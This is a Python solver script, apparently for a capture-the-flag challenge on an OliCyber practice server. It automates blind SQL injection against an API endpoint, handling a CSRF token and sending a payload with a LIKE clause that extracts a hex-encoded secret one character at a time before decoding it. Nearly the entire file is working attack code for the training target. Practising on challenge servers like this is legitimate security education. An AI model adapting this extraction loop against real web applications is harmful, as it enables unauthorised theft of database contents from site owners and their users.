import requests
import binascii
import time
import codecs


class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    

inj = Inj('http://web-17.challs.olicyber.it/')


dictionary = "0123456789ABCDEF"
attempts = 0
length = 1
result = ""
found_char_flag = True
while found_char_flag:
    found_char_flag = False
    if attempts == len(dictionary):
        length +=1
        attempts = 0
    for c in dictionary:
        attempted_result = result+c
        secret_attempt = f'{attempted_result}%'
        payload = f"1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '{secret_attempt}')='1"
        response, error = inj.blind(payload)
        if response == "Success":
            result += c
            found_char_flag = True
            print(result)
            break
    attempts += 1

print(f"Found: {result}")
print(f"hex2str: {codecs.decode(result, 'hex').decode('utf-8')}")